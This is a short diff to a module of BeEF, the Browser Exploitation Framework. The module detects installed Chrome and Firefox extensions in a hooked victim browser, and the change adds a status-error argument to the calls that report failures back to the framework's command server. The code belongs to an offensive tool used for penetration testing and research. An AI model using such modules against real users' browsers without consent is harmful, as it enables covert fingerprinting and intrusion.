@@ -1087,7 +1087,7 @@ beef.execute(function() {
                                 detect_chrome_extension(chrome_extensions[i][0], chrome_extensions[i][1]);
                         }
                 } catch(e) {
-                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Chrome extensions failed');
+                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Chrome extensions failed', beef.are.status_error());
                 }
         } else if(beef.browser.isFF()) {
                 try {
@@ -1095,13 +1095,13 @@ beef.execute(function() {
                                 detect_firefox_extension(firefox_extensions[i], i);
                         }
                 } catch(e) {
-                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Firefox extensions failed');
+                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Firefox extensions failed', beef.are.status_error());
                 }
         } else if(beef.browser.isIE()) {
                 try {
-                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Internet Explorer extensions is not supported');
+                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Internet Explorer extensions is not supported', beef.are.status_error());
                 } catch(e) {
-                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Internet Explorer extensions failed');
+                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Internet Explorer extensions failed', beef.are.status_error());
                 }
         }
 
